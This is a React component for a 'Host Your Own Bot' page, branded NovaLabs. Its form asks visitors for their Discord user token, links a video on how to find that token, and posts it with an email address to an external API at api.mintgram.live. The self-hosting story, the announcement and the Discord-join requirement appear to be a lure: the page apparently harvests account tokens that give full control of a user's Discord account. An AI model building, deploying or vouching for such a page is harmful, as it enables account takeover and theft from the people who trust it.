import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Server,
  Key,
  Check,
  ExternalLink,
  Play,
  Megaphone,
} from "lucide-react";
import { toast } from "sonner";
import axios from "axios";

const HostYourBot = () => {
  const [formData, setFormData] = useState({
    token: "",
    email: "",
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.token) {
      toast.error("Token is required");
      return;
    }

    try {
      setIsSubmitting(true);

      const response = await axios.post(
        "https://api.mintgram.live/token",
        formData
      );

      toast.success("Bot hosting request submitted", {
        description: response.data?.message || "Submitted successfully",
      });

      setFormData({ token: "", email: "" });
    } catch (err: any) {
      toast.error("Request failed", {
        description: err.response?.data?.message || "Server error",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  return (
    <section id="host-your-bot" className="relative py-24 overflow-hidden">
      {/* background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute bottom-0 right-1/4 w-[600px] h-[600px] bg-primary/5 rounded-full blur-[100px]" />
      </div>

      <div className="container relative z-10 px-4">
        <div className="max-w-2xl mx-auto">
          {/* header */}
          <div className="text-center mb-12">
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full glass text-sm mb-6">
              <Server className="w-4 h-4 text-primary" />
              <span className="text-muted-foreground">Self-Hosting</span>
            </div>
            <h2 className="text-3xl md:text-5xl font-bold mb-4">
              Host Your <span className="text-gradient">Own Bot</span>
            </h2>
            <p className="text-muted-foreground text-lg">
              Deploy your own instance with full control.
            </p>
          </div>

          {/* ANNOUNCEMENT */}
          <div className="glass-strong rounded-2xl p-5 mb-8 border border-primary/30">
            <div className="flex items-center gap-2 mb-2">
              <Megaphone className="w-5 h-5 text-primary" />
              <h3 className="font-semibold">NovaLabs Announcement</h3>
            </div>
            <p className="text-sm text-muted-foreground">
              Hey NovaLabs users 👋  
              We’re excited to announce that we’re coming with **new features**
              for our bot. Be ready — updates are coming very soon 🚀
            </p>
          </div>

          {/* VIDEO */}
          <div className="glass-strong rounded-2xl p-6 mb-8 border border-primary/30">
            <div className="flex items-center gap-2 mb-3">
              <Play className="w-5 h-5 text-primary" />
              <h3 className="font-semibold text-base">
                How to Host Your Bot
              </h3>
            </div>

            <p className="text-sm text-muted-foreground mb-4">
              Watch this short video to understand how to host your bot properly
              before submitting your token.
            </p>

            <div className="relative w-full aspect-[9/16] max-w-[260px] mx-auto rounded-xl overflow-hidden border border-primary/40">
              <iframe
                src="https://www.youtube.com/embed/-ds8_JRmuuw"
                title="How to host your bot"
                className="w-full h-full"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
              />
            </div>
          </div>

          {/* FORM */}
          <form
            onSubmit={handleSubmit}
            className="glass-strong rounded-2xl p-8 space-y-6"
          >
            {/* DISCORD WARNING */}
            <div className="rounded-xl border border-yellow-500/30 bg-yellow-500/10 p-4 text-sm">
              <p className="font-medium text-yellow-400 mb-1">
                ⚠️ Important
              </p>
              <p className="text-muted-foreground">
                You must join our Discord server before proceeding.
              </p>
              <a
                href="https://discord.gg/zsvWyHpCQV"
                target="_blank"
                rel="noopener noreferrer"
                className="mt-2 inline-block text-primary underline"
              >
                👉 Join Discord Server
              </a>
            </div>

            {/* TOKEN */}
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <label className="flex items-center gap-2 text-sm font-medium">
                  <Key className="w-4 h-4 text-primary" />
                  User Token <span className="text-destructive">*</span>
                </label>
                <a
                  href="https://youtube.com/shorts/-ds8_JRmuuw?si=xLO5Uzmky1H7ujmH"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-1.5 text-xs text-primary"
                >
                  <Play className="w-3.5 h-3.5" />
                  How to find token
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>

              <Input
                type="password"
                name="token"
                placeholder="Enter your Discord token"
                value={formData.token}
                onChange={handleChange}
                className="font-mono"
              />
            </div>

            <Button
              type="submit"
              variant="hero"
              size="lg"
              className="w-full"
              disabled={isSubmitting}
            >
              {isSubmitting ? "Processing..." : (
                <>
                  <Check className="w-5 h-5" />
                  Submit Hosting Request
                </>
              )}
            </Button>
          </form>
        </div>
      </div>
    </section>
  );
};

export default HostYourBot;
